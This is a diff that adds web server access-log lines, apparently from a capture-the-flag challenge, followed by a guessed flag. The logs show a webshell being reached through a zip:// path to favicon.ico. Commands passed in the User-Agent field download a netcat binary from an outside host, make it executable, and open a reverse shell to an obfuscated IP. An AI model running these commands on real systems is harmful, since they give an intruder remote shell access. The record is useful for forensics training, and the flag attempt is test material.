@@ -1,0 +1,11 @@
+10.9.4.20 - - [19/Aug/2021:22:12:18 +0900] "GET /view.php?img=zip:///srv/img/favicon.ico#cover HTTP/1.1" 200 "-" "python -c 'with open("/tmp/12b19f0d75d1066372d384ef3b34b804", "wb") as f: import requests; f.write(requests.get("http://pwn.sagona.kr/netcat_static-le"));'"
+10.9.4.20 - - [19/Aug/2021:22:12:30 +0900] "GET /view.php?img=zip:///srv/img/favicon.ico#cover HTTP/1.1" 200 "-" "chmod +x /tmp/12b19f0d75d1066372d384ef3b34b804"
+10.9.4.20 - - [19/Aug/2021:22:12:43 +0900] "GET /view.php?img=zip:///srv/img/favicon.ico#cover HTTP/1.1" 200 "-" "/tmp/12b19f0d75d1066372d384ef3b34b804 -e /bin/sh 0x1b170a11 19994"
+
+
+ No ;( CDDC22{favicon.ico_12b19f0d75d1066372d384ef3b34b804_pwn.sagona.kr_WHAT_IS_IT?}
+
+
+we think all fields except the ip is correct.
+
+
